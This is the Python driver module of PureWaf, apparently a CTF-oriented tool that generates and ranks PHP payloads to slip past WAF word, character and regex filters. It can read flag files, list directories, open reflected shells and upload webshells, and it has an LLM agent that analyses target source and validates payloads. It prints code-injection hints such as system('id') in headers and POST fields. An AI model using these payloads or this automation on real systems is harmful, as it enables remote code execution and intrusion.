# main package

import importlib
import logging
import os
import sys
import time
import urllib.parse
from dataclasses import dataclass
from dataclasses import replace
from pathlib import Path
from typing import List

from . import bypass
from . import bypass_data
from . import utils

version = "2.1.0"

SPECIAL_UPLOAD_POC_PAYLOAD = bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS[1]
SPECIAL_UPLOAD_POC_EGS = bypass_data.SPECIAL_UPLOAD_POC_EGS
BACKTRACK_LIMIT_POC_EGS = bypass_data.BACKTRACK_LIMIT_POC_EGS

WEBUI_MIN_PYTHON = (3, 9)
WEBUI_FLASK_SPEC = "flask>=3.1,<4"
WEBUI_INSTALL_COMMAND = f'pip install "{WEBUI_FLASK_SPEC}"'


@dataclass(frozen=True)
class PureWafConfig:
    waf_words: str = ""
    waf_chars: str = ""
    waf_regex: str = ""
    payload_context: str = "any"
    limit_length: int = 999999
    flagfile: str = "/flag"
    read_env: bool = False
    reflect_shell: bool = False
    port: int = 8080
    ip: str = "127.0.0.1"
    phpinfo: bool = False
    upload: bool = False
    log_level: str = "INFO"
    total_payload: bool = False
    phpv: float = 7.0
    auto: bool = False
    webui: bool = False
    agent: bool = False
    auto_context: object = None


@dataclass
class PureWafExecutionResult:
    shortest_root: str
    shortest_flag: str
    root_passed_payloads: List[str]
    flag_passed_payloads: List[str]
    tips_text: str
    log_text: str


def banner(version_text):
    return rf"""
 ____                      __        __     ___
|  _ \ _   _ _ __ ___      \ \      / /_ _ |  _|
| |_) | | | | '__/ _ \      \ \ /\ / / _` /| |_
|  __/| |_| | | | (_) |      \ V  V / (_| \|  _|
|_|    \__,_|_|  \___/        \_/\_/ \__,_||_|

    [ PureWaf :: Pure You Hate ]
    [ Author  :: Pure Stream ]
    [ Version :: {version_text}]
    [ Github  :: https://github.com/PureStream108/PureWaf ]


"""


class _ExecutionLogger:
    def __init__(self, forward_logger=None, event_callback=None):
        self.forward_logger = forward_logger
        self.event_callback = event_callback
        self.messages = []

    def info(self, message):
        self._emit("info", message)

    def warning(self, message):
        self._emit("warning", message)

    def error(self, message):
        self._emit("error", message)

    def _emit(self, level, message):
        text = str(message)
        self.messages.append(text)
        if self.forward_logger:
            getattr(self.forward_logger, level)(text)
        _emit_event(
            self.event_callback,
            {
                "type": "log",
                "level": level,
                "message": text,
            },
        )


def _emit_event(event_callback, event):
    if event_callback:
        event_callback(event)


def _configure_logger(log_level: str):
    logger = logging.getLogger("PureWaf")
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter("%(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)

    level_name = (log_level or "INFO").upper()
    if level_name not in ["DEBUG", "INFO", "QUIET"]:
        logger.warning("[!] Invalid log level, using INFO instead.")
        level_name = "INFO"

    show_progress = True
    if level_name == "QUIET":
        logger.setLevel(logging.CRITICAL)
        sys.stdout = open(os.devnull, "w")
        show_progress = False
    else:
        logger.setLevel(getattr(logging, level_name))

    if level_name != "DEBUG":
        import warnings

        warnings.filterwarnings("ignore")

    return logger, show_progress


def _emit_special_payload_egs(logger, payload):
    if payload not in bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS:
        return
    logger.info("Example: ")
    for line in bypass_data.SPECIAL_UPLOAD_POC_EGS.splitlines():
        logger.info(line)


def _extract_regex_pattern(waf_regex: str):
    if not waf_regex:
        return ""
    pattern = waf_regex.strip()
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        return pattern[1:last]
    return pattern


def _looks_like_backtrack_risk_regex(waf_regex: str):
    pattern = _extract_regex_pattern(waf_regex)
    if not pattern:
        return False

    lowered = pattern.lower()
    if "(?r)" in lowered or "(?0)" in lowered:
        return True

    has_anchors = "^" in pattern and "$" in pattern
    has_greedy_prefix = ".*(" in pattern or ".+(" in pattern
    has_repeat = "*" in pattern or "+" in pattern or "{" in pattern
    has_wide_class = r"\w" in pattern or r"\W" in pattern

    return has_anchors and has_greedy_prefix and has_repeat and has_wide_class


def _emit_contextual_tips(logger, payload, waf_regex):
    _emit_special_payload_egs(logger, payload)

    if payload in bypass_data.HEADER_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: User-Agent: 1=system('id');")
        logger.info("TIPS: User-Agent: system('id');")

    if payload in bypass_data.VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: POST: 1=system('id');")

    if payload in bypass_data.ASSERT_POST_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: POST: 2=system('id');")

    if payload == utils.generate_nan_seed_post_gateway():
        logger.info("TIPS: POST: 0=assert")
        logger.info("TIPS: POST: 1=system('id');")

    if _looks_like_backtrack_risk_regex(waf_regex):
        logger.info("Example:")
        for line in BACKTRACK_LIMIT_POC_EGS.splitlines():
            logger.info(line)


def _is_upload_payload(payload: str):
    candidates = [payload]
    try:
        once = urllib.parse.unquote(payload)
    except Exception:
        once = payload
    candidates.append(once)
    try:
        twice = urllib.parse.unquote(once)
    except Exception:
        twice = once
    candidates.append(twice)

    for text in candidates:
        normalized = text.strip().lower()
        if normalized.startswith("<?"):
            return True
        if normalized.startswith("<%"):
            return True
        if normalized.startswith('<script language="php">'):
            return True
        if normalized.startswith("gif89a<?"):
            return True
        if normalized.startswith("gif89a<%"):
            return True
        if normalized.startswith('gif89a<script language="php">'):
            return True
    return False


def _choose_upload_payload(passed_payloads, prefer_order=False):
    wrapped = [payload for payload in passed_payloads if _is_upload_payload(payload)]
    if not wrapped:
        return "N/A"

    raw_wrapped = []
    for payload in wrapped:
        try:
            decoded = urllib.parse.unquote(payload)
        except Exception:
            decoded = payload
        if decoded == payload:
            raw_wrapped.append(payload)

    if raw_wrapped:
        if prefer_order:
            return raw_wrapped[0]
        return min(raw_wrapped, key=len)
    if prefer_order:
        return wrapped[0]
    return min(wrapped, key=len)


def _choose_shortest_payload(passed_payloads, upload: bool, prefer_order=False):
    if not passed_payloads:
        return "N/A"
    if upload:
        return _choose_upload_payload(passed_payloads, prefer_order=prefer_order)
    return min(passed_payloads, key=len)


def _choose_final_payload(shortest_flag: str, shortest_root: str = "N/A"):
    flag_payload = str(shortest_flag or "").strip()
    if flag_payload and flag_payload != "N/A":
        return flag_payload
    root_payload = str(shortest_root or "").strip()
    if root_payload and root_payload != "N/A":
        return root_payload
    return "N/A"


def _normalize_php_version(phpv, logger):
    try:
        return float(phpv)
    except (ValueError, TypeError):
        logger.error(f"[!] Invalid php_version: {phpv}. Using default 7.0")
        return 7.0


def _log_configuration(logger, config: PureWafConfig, phpv: float):
    logger.info("")
    logger.info("-" * 40)
    logger.info("[*] Configuration:")
    logger.info(f"    - waf_words: {config.waf_words}")
    logger.info(f"    - waf_chars: {config.waf_chars}")
    logger.info(f"    - waf_regex: {config.waf_regex}")
    logger.info(f"    - payload_context: {config.payload_context}")
    logger.info(f"    - limit_length: {config.limit_length}")
    logger.info(f"    - flagfile: {config.flagfile}")
    logger.info(f"    - read_env: {config.read_env}")
    logger.info(f"    - reflect_shell: {config.reflect_shell}")
    logger.info(f"    - upload: {config.upload}")
    logger.info(f"    - port: {config.port}")
    logger.info(f"    - ip: {config.ip}")
    logger.info(f"    - phpinfo: {config.phpinfo}")
    logger.info(f"    - phpv: {phpv}")
    logger.info(f"    - log_level: {config.log_level}")
    logger.info(f"    - total_payload: {config.total_payload}")
    logger.info(f"    - auto: {config.auto}")
    logger.info(f"    - agent: {config.agent}")
    logger.info("-" * 40)
    logger.info("")


def _build_filter_progress_callback(event_callback, scope: str, phase: str):
    if not event_callback:
        return None

    def callback(event):
        event_payload = dict(event)
        event_payload["scope"] = scope
        event_payload["phase"] = phase
        _emit_event(event_callback, event_payload)

    return callback


def _build_filter_trace_callback(event_callback, scope: str, phase: str):
    if not event_callback:
        return None

    def callback(event):
        event_payload = dict(event)
        event_payload["scope"] = scope
        event_payload["phase"] = phase
        _emit_event(event_callback, event_payload)

    return callback


def _emit_candidate_events(event_callback, scope: str, phase: str, scope_label: str, payloads):
    if not event_callback:
        return

    total = len(payloads)
    _emit_event(
        event_callback,
        {
            "type": "stage",
            "scope": scope,
            "phase": phase,
            "message": f"[*] {scope_label} {phase} payloads: {total}",
        },
    )
    for idx, payload in enumerate(payloads, start=1):
        _emit_event(
            event_callback,
            {
                "type": "candidate",
                "scope": scope,
                "phase": phase,
                "current": idx,
                "total": total,
                "payload": payload,
                "techniques": list(bypass.infer_payload_techniques(payload)),
            },
        )


def _process_payload_scope(
    scope_key: str,
    scope_label: str,
    options,
    waf_words_list,
    waf_chars_set,
    waf_regex_obj,
    config: PureWafConfig,
    strategies,
    logger,
    show_progress: bool,
    event_callback=None,
):
    logger.info(f"[*] Generating payloads for {scope_label}...")

    base_payloads = bypass.generate_candidates(options)
    if not base_payloads:
        logger.warning(f"[!] No base payloads generated for {scope_label}.")
        return "N/A", []
    _emit_candidate_events(event_callback, scope_key, "base", scope_label, base_payloads)

    targeted_payloads = bypass._build_targeted_candidates(
        base_payloads,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        payload_context=config.payload_context,
    )
    _emit_candidate_events(event_callback, scope_key, "targeted", scope_label, targeted_payloads)
    passed_payloads = bypass.filter_payloads(
        targeted_payloads,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        config.limit_length,
        show_progress=show_progress,
        verbose=config.total_payload,
        progress_callback=_build_filter_progress_callback(event_callback, scope_key, "targeted"),
        trace_callback=_build_filter_trace_callback(event_callback, scope_key, "targeted"),
    )
    shortest_payload = _choose_shortest_payload(
        passed_payloads,
        config.upload,
        prefer_order=False,
    )
    final_passed_payloads = passed_payloads

    if shortest_payload == "N/A":
        _emit_event(
            event_callback,
            {
                "type": "stage",
                "scope": scope_key,
                "phase": "encoded_fallback",
                "message": f"[*] Trying encoded payload fallback for {scope_label}...",
            },
        )
        encoded_payloads = bypass.apply_encodings(base_payloads, strategies)
        _emit_candidate_events(event_callback, scope_key, "encoded", scope_label, encoded_payloads)
        fallback_passed_payloads = bypass.filter_payloads(
            encoded_payloads,
            waf_words_list,
            waf_chars_set,
            waf_regex_obj,
            config.limit_length,
            show_progress=show_progress,
            verbose=config.total_payload,
            progress_callback=_build_filter_progress_callback(event_callback, scope_key, "fallback"),
            trace_callback=_build_filter_trace_callback(event_callback, scope_key, "fallback"),
        )
        shortest_payload = _choose_shortest_payload(
            fallback_passed_payloads,
            config.upload,
            prefer_order=False,
        )
        if fallback_passed_payloads:
            final_passed_payloads = fallback_passed_payloads

    if shortest_payload == "N/A":
        if config.upload:
            logger.warning(f"[!] No wrapped payload passed WAF filters for {scope_label}.")
        else:
            logger.warning(f"[!] No payload passed WAF filters for {scope_label}.")

    return shortest_payload, final_passed_payloads


def _execute_purewaf(
    config: PureWafConfig,
    output_logger=None,
    show_progress=True,
    sleep_before_run=True,
    event_callback=None,
):
    logger = _ExecutionLogger(forward_logger=output_logger, event_callback=event_callback)

    logger.info(banner(version).rstrip())
    if sleep_before_run:
        time.sleep(1)

    phpv = _normalize_php_version(config.phpv, logger)
    _log_configuration(logger, config, phpv)

    waf_words_list = utils.parse_waf_words(config.waf_words)
    waf_chars_set = utils.parse_waf_chars(config.waf_chars)
    waf_regex_obj = utils.parse_waf_regex(config.waf_regex)
    strategies = utils.get_encoding_strategies()

    options_root = bypass.BypassOptions(
        flagfile="/",
        read_env=False,
        reflect_shell=False,
        ip=config.ip,
        port=config.port,
        phpinfo=False,
        php_version=phpv,
        upload=config.upload,
        payload_context=config.payload_context,
        auto_context=config.auto_context,
    )

    options_flag = bypass.BypassOptions(
        flagfile=config.flagfile,
        read_env=config.read_env,
        reflect_shell=config.reflect_shell,
        ip=config.ip,
        port=config.port,
        phpinfo=config.phpinfo,
        php_version=phpv,
        upload=config.upload,
        payload_context=config.payload_context,
        auto_context=config.auto_context,
    )

    shortest_root, root_passed_payloads = _process_payload_scope(
        "root",
        "Root Directory",
        options_root,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        config,
        strategies,
        logger,
        show_progress,
        event_callback=event_callback,
    )

    logger.info("")

    shortest_flag, flag_passed_payloads = _process_payload_scope(
        "flag",
        "Flag File",
        options_flag,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        config,
        strategies,
        logger,
        show_progress,
        event_callback=event_callback,
    )

    logger.info("")
    logger.info("-" * 40)
    logger.info(f"[+] Final Payload: {_choose_final_payload(shortest_flag, shortest_root)}")
    logger.info("-" * 40)
    logger.info("")

    tips_logger = _ExecutionLogger(forward_logger=logger, event_callback=event_callback)
    _emit_contextual_tips(tips_logger, shortest_flag, config.waf_regex)
    logger.info("")

    return PureWafExecutionResult(
        shortest_root=shortest_root,
        shortest_flag=shortest_flag,
        root_passed_payloads=root_passed_payloads,
        flag_passed_payloads=flag_passed_payloads,
        tips_text="\n".join(tips_logger.messages),
        log_text="\n".join(logger.messages),
    )


def _build_agent_auto_execution_config(config: PureWafConfig, analysis):
    return replace(
        config,
        waf_words=analysis.waf_words,
        waf_chars=analysis.waf_chars,
        waf_regex=analysis.waf_regex,
        payload_context=analysis.payload_context,
        limit_length=analysis.limit_length,
        flagfile="/flag",
        read_env=analysis.read_env,
        reflect_shell=False,
        phpinfo=False,
        upload=analysis.upload,
        total_payload=False,
        phpv=analysis.php_version_hint or 7.0,
        auto=True,
        webui=False,
        agent=True,
        auto_context=analysis.to_context(),
    )


def _format_agent_review_lines(review):
    lines = []
    if review.used:
        if review.valid:
            status = "accepted"
        elif review.fallback_payload:
            status = "fallback_required"
        else:
            status = "rejected"
        lines.append(f"[*] AGENT: payload review => {status}")
    if review.error:
        lines.append(f"[*] AGENT: payload review skipped => {review.error}")
    if review.notes:
        lines.append(f"[*] AGENT: review notes => {review.notes}")
    if review.fallback_payload:
        lines.append(f"[+] Final Payload: {review.fallback_payload}")
    return lines


def _format_agent_validation_lines(validation_results):
    lines = []
    if not validation_results:
        return lines
    passed = sum(1 for item in validation_results if getattr(item, "passed", False))
    attempted = sum(1 for item in validation_results if getattr(item, "attempted", False))
    skipped = sum(1 for item in validation_results if getattr(item, "skipped", False))
    if passed:
        status = "passed"
    elif attempted:
        status = "failed"
    else:
        status = "skipped"
    lines.append(
        "[*] AGENT: payload validation => "
        f"{status} attempted={attempted} passed={passed} skipped={skipped}"
    )
    first_reason = ""
    for item in validation_results:
        first_reason = getattr(item, "reason", "") or ""
        if first_reason:
            break
    if first_reason:
        lines.append(f"[*] AGENT: validation notes => {first_reason}")
    return lines


def _format_agent_llm_failure(error: str):
    detail = str(error or "").strip()
    return f"LLM调用失败: {detail}" if detail else "LLM调用失败"


def _replace_final_payload_line(log_text: str, final_payload: str):
    line = f"[+] Final Payload: {final_payload}"
    lines = []
    replaced = False
    for raw_line in (log_text or "").splitlines():
        if raw_line.startswith("[+] Final Payload:"):
            if not replaced:
                lines.append(line)
                replaced = True
            continue
        lines.append(raw_line)
    if not replaced:
        lines.append(line)
    return "\n".join(lines).strip()


def _append_agent_review_to_result(result: PureWafExecutionResult, review):
    lines = _format_agent_review_lines(review)
    if not lines:
        return result
    if review.fallback_payload and (result.shortest_flag == "N/A" or not review.valid):
        result.shortest_flag = review.fallback_payload
        result.flag_passed_payloads = [review.fallback_payload]
    result.log_text = _replace_final_payload_line(
        result.log_text,
        _choose_final_payload(result.shortest_flag, result.shortest_root),
    )
    suffix_lines = [line for line in lines if not line.startswith("[+] Final Payload:")]
    suffix = "\n".join(suffix_lines)
    if suffix:
        result.log_text = (result.log_text.rstrip() + "\n" + suffix).strip()
    if review.notes or review.fallback_payload:
        tips_suffix = "\n".join(lines)
        result.tips_text = (result.tips_text.rstrip() + "\n" + tips_suffix).strip()
    return result


def _execute_agent_auto_from_project(
    config: PureWafConfig,
    output_logger=None,
    show_progress=True,
):
    from .agent import AgentStepLimitExceeded
    from .agent import PureWafAgentSession
    from .agent import PureWafProjectAgent
    from .auto import resolve_auto_parameters

    session = PureWafAgentSession(cwd=Path.cwd())
    try:
        project_agent = PureWafProjectAgent(cwd=Path.cwd(), session=session)
        bundle = project_agent.build_project_source(Path.cwd() / "pure")
        if output_logger:
            for line in bundle.analysis_lines:
                output_logger.info(line)
        if bundle.selection_error:
            session.fail(bundle.selection_error)
            return _format_agent_llm_failure(bundle.selection_error)

        session.start_phase("stage_1_sink_analysis", {"source_bytes": len(bundle.source)})
        analysis = resolve_auto_parameters(bundle.source, use_llm=True, agent_session=session)
        session.remember(
            "sink_analysis",
            {
                "sink_kind": analysis.sink_kind,
                "sink_function": analysis.sink_function,
                "payload_context": analysis.payload_context,
                "waf_words": analysis.waf_words,
                "waf_chars": analysis.waf_chars,
                "waf_regex": analysis.waf_regex,
                "error": analysis.error,
                "llm_error": analysis.llm_error,
            },
        )
        if output_logger and analysis.analysis_lines:
            for line in analysis.analysis_lines:
                output_logger.info(line)
        if analysis.llm_error:
            session.fail(analysis.llm_error)
            return _format_agent_llm_failure(analysis.llm_error)

        if analysis.error:
            session.start_phase("stage_3_agent_fallback", {"analysis_error": analysis.error})
            review = project_agent.review_payloads(
                bundle.source,
                analysis.analysis_lines + [analysis.error],
            )
            if output_logger:
                for line in _format_agent_review_lines(review):
                    output_logger.info(line)
            if review.error:
                session.fail(review.error)
                return _format_agent_llm_failure(review.error)
            session.finish({"fallback_payload": review.fallback_payload, "analysis_error": analysis.error})
            return review.fallback_payload or analysis.error

        session.start_phase("stage_2_purewaf_generation", {"sink_kind": analysis.sink_kind})
        execution_config = _build_agent_auto_execution_config(config, analysis)
        result = _execute_purewaf(
            execution_config,
            output_logger=output_logger,
            show_progress=show_progress,
            sleep_before_run=False,
        )
        session.remember(
            "purewaf_generation",
            {
                "shortest_root": result.shortest_root,
                "shortest_flag": result.shortest_flag,
                "root_payload_count": len(result.root_passed_payloads),
                "flag_payload_count": len(result.flag_passed_payloads),
            },
        )

        validation_payloads = []
        if result.shortest_flag and result.shortest_flag != "N/A":
            validation_payloads.append(result.shortest_flag)
        for payload in result.flag_passed_payloads:
            if payload not in validation_payloads:
                validation_payloads.append(payload)
            if len(validation_payloads) >= 3:
                break
        validation_results = project_agent.validate_payloads(
            validation_payloads,
            sink_kind=analysis.sink_kind,
            payload_context=analysis.payload_context,
            flagfile=execution_config.flagfile,
        )
        if output_logger:
            for line in _format_agent_validation_lines(validation_results):
                output_logger.info(line)

        session.start_phase("stage_2_payload_review", {"validation_count": len(validation_results)})
        review = project_agent.review_payloads(
            bundle.source,
            analysis.analysis_lines,
            shortest_root=result.shortest_root,
            shortest_flag=result.shortest_flag,
            root_payloads=result.root_passed_payloads,
            flag_payloads=result.flag_passed_payloads,
            validation_results=validation_results,
        )
        _append_agent_review_to_result(result, review)
        if output_logger:
            for line in _format_agent_review_lines(review):
                output_logger.info(line)
        if review.error:
            session.fail(review.error)
            return _format_agent_llm_failure(review.error)
        session.finish(
            {
                "shortest_flag": result.shortest_flag,
                "review_valid": review.valid,
                "fallback_payload": review.fallback_payload,
            }
        )
        return result.shortest_flag
    except AgentStepLimitExceeded as exc:
        session.fail(str(exc))
        return str(exc)


def _launch_webui(config: PureWafConfig):
    if sys.version_info < WEBUI_MIN_PYTHON:
        current_version = ".".join(str(part) for part in sys.version_info[:3])
        minimum_version = ".".join(str(part) for part in WEBUI_MIN_PYTHON)
        raise RuntimeError(
            "Web UI requires Python "
            f"{minimum_version}+; current Python is {current_version}. "
            f"Install {WEBUI_FLASK_SPEC} on Python {minimum_version}+."
        )
    try:
        webui_module = importlib.import_module(".webui", package=__package__)
    except ModuleNotFoundError as exc:
        missing_name = exc.name or ""
        if missing_name.startswith("flask"):
            raise RuntimeError(
                "Web UI dependencies are incomplete or outdated. "
                f"Current Python is {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}. "
                f"Install or upgrade them with: {WEBUI_INSTALL_COMMAND}"
            ) from exc
        raise
    webui_module.launch_webui(config)


def purewaf(
    waf_words="",
    waf_chars="",
    waf_regex="",
    payload_context="any",
    limit_length=999999,
    flagfile="/flag",
    read_env=False,
    reflect_shell=False,
    port=8080,
    ip="127.0.0.1",
    phpinfo=False,
    upload=False,
    log_level="INFO",
    total_payload=False,
    phpv=7.0,
    auto=False,
    webui=False,
    agent=False,
):
    if auto and not (webui or agent):
        raise RuntimeError("auto=True can only be used together with webui=True or agent=True.")

    config = PureWafConfig(
        waf_words=waf_words,
        waf_chars=waf_chars,
        waf_regex=waf_regex,
        payload_context=payload_context,
        limit_length=limit_length,
        flagfile=flagfile,
        read_env=read_env,
        reflect_shell=reflect_shell,
        port=port,
        ip=ip,
        phpinfo=phpinfo,
        upload=upload,
        log_level=log_level,
        total_payload=total_payload,
        phpv=phpv,
        auto=auto,
        webui=webui,
        agent=agent,
    )

    if config.webui:
        _launch_webui(config)
        return None

    output_logger, show_progress = _configure_logger(config.log_level)
    if config.auto and config.agent:
        cwd = Path.cwd()
        if not (cwd / ".env").exists() or not (cwd / "pure").is_dir():
            return ".env/pure Not FOUND"
        return _execute_agent_auto_from_project(
            config,
            output_logger=output_logger,
            show_progress=show_progress,
        )

    result = _execute_purewaf(
        config,
        output_logger=output_logger,
        show_progress=show_progress,
        sleep_before_run=True,
    )
    return result.shortest_flag
